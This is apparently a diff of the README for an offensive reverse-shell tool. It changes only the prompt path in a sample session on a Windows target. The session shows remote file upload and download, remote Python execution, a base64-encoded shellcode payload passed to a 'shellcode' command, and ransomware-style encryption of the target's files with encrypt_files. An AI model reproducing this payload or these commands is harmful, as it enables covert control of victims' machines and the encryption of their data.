@@ -129,44 +129,44 @@ WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ download_url
 Done
 WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ cd ..
 done
-WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\Hardis\Dev\Offensive$ update_environment
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents$ update_environment
 done
-WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ upload_file shellcode.py shellcode2.py
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents$ upload_file shellcode.py shellcode2.py
 ['shellcode.py', 'shellcode2.py']
 done
-WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ download_file shellcode2.py
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents$ download_file shellcode2.py
 done
-WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ python3_exec print('qwerty')
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents$ python3_exec print('qwerty')
 qwerty
 None
-WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ upload_file_compress shellcode.py shellcode2.py
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents$ upload_file_compress shellcode.py shellcode2.py
 ['shellcode.py', 'shellcode2.py']
 done
-WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ download_file_compress shellcode2.py
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents$ download_file_compress shellcode2.py
 done
-WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ python3_exec_compress print('qwerty')
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents$ python3_exec_compress print('qwerty')
 qwerty
 None
-WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ shellcode SDHJSIHp3f///0iNBe////9Iu9MZW06IcMOdSDFYJ0gt+P///+L0L1HYqniYA53TGRofySCRzIVRapztOEjPs1HQHJA4SM/zUdA82DjMKplTFn9BOPJdfyU6Mopc49wS0FYPibEhcIFYCgYDIuMWkSUTT1j7QxXTGVsGDbC3+psYix4DONvZWFl7B4mgIMub5pIPA0RL1dLPFn9BOPJdf1iah4Uxwlzr+S6/xHOPudtcYp/9qJvZWFl/B4mgpdxYFRMKAzDf1NLJGsWM+IucA1gDD9AumseSQRoXySqLHj85Ghx3kJvcikMTxZqZlGIs5gYGMnHDndMZW06IOE4Q0hhbTsnK8ha8nqSbM5Det9lY4egdzV5iBlHYiqBMxeHZmaCu/XV42sBrNCSIKYIUCeaOLekcoLO2YT5OiHDDnQ==
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents$ shellcode SDHJSIHp3f///0iNBe////9Iu9MZW06IcMOdSDFYJ0gt+P///+L0L1HYqniYA53TGRofySCRzIVRapztOEjPs1HQHJA4SM/zUdA82DjMKplTFn9BOPJdfyU6Mopc49wS0FYPibEhcIFYCgYDIuMWkSUTT1j7QxXTGVsGDbC3+psYix4DONvZWFl7B4mgIMub5pIPA0RL1dLPFn9BOPJdf1iah4Uxwlzr+S6/xHOPudtcYp/9qJvZWFl/B4mgpdxYFRMKAzDf1NLJGsWM+IucA1gDD9AumseSQRoXySqLHj85Ghx3kJvcikMTxZqZlGIs5gYGMnHDndMZW06IOE4Q0hhbTsnK8ha8nqSbM5Det9lY4egdzV5iBlHYiqBMxeHZmaCu/XV42sBrNCSIKYIUCeaOLekcoLO2YT5OiHDDnQ==
 
-WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ shellcode_compress SDHJSIHp3f///0iNBe////9Iu9MZW06IcMOdSDFYJ0gt+P///+L0L1HYqniYA53TGRofySCRzIVRapztOEjPs1HQHJA4SM/zUdA82DjMKplTFn9BOPJdfyU6Mopc49wS0FYPibEhcIFYCgYDIuMWkSUTT1j7QxXTGVsGDbC3+psYix4DONvZWFl7B4mgIMub5pIPA0RL1dLPFn9BOPJdf1iah4Uxwlzr+S6/xHOPudtcYp/9qJvZWFl/B4mgpdxYFRMKAzDf1NLJGsWM+IucA1gDD9AumseSQRoXySqLHj85Ghx3kJvcikMTxZqZlGIs5gYGMnHDndMZW06IOE4Q0hhbTsnK8ha8nqSbM5Det9lY4egdzV5iBlHYiqBMxeHZmaCu/XV42sBrNCSIKYIUCeaOLekcoLO2YT5OiHDDnQ==
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents$ shellcode_compress SDHJSIHp3f///0iNBe////9Iu9MZW06IcMOdSDFYJ0gt+P///+L0L1HYqniYA53TGRofySCRzIVRapztOEjPs1HQHJA4SM/zUdA82DjMKplTFn9BOPJdfyU6Mopc49wS0FYPibEhcIFYCgYDIuMWkSUTT1j7QxXTGVsGDbC3+psYix4DONvZWFl7B4mgIMub5pIPA0RL1dLPFn9BOPJdf1iah4Uxwlzr+S6/xHOPudtcYp/9qJvZWFl/B4mgpdxYFRMKAzDf1NLJGsWM+IucA1gDD9AumseSQRoXySqLHj85Ghx3kJvcikMTxZqZlGIs5gYGMnHDndMZW06IOE4Q0hhbTsnK8ha8nqSbM5Det9lY4egdzV5iBlHYiqBMxeHZmaCu/XV42sBrNCSIKYIUCeaOLekcoLO2YT5OiHDDnQ==
 
-WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ encrypt_file test.html
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents$ encrypt_file test.html
 [!] Invalid command detected for 'encrypt_files' command. Minimum 2 arguments are required.
 [*] USAGE: encrypt_files [key] [filename1] [filename2] ... [filenameX]
-WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ encrypt_file qwerty test.html
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents$ encrypt_file qwerty test.html
 Encryption is running...
 [*] 1 childs process are running...
-WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ decrypt_file qwerty test.html
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents$ decrypt_file qwerty test.html
 Decryption is running...
 [*] 1 childs process are running...
-WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ encrypt_files qwerty *.html *.zip
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents$ encrypt_files qwerty *.html *.zip
 Encryption is running...
 [*] 2 childs process are running...
-WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ decrypt_files qwerty *.html *.zip
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents$ decrypt_files qwerty *.html *.zip
 Decryption is running...
 [*] 2 childs process are running...
-WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents$
 ```
 
 ## Screenshots
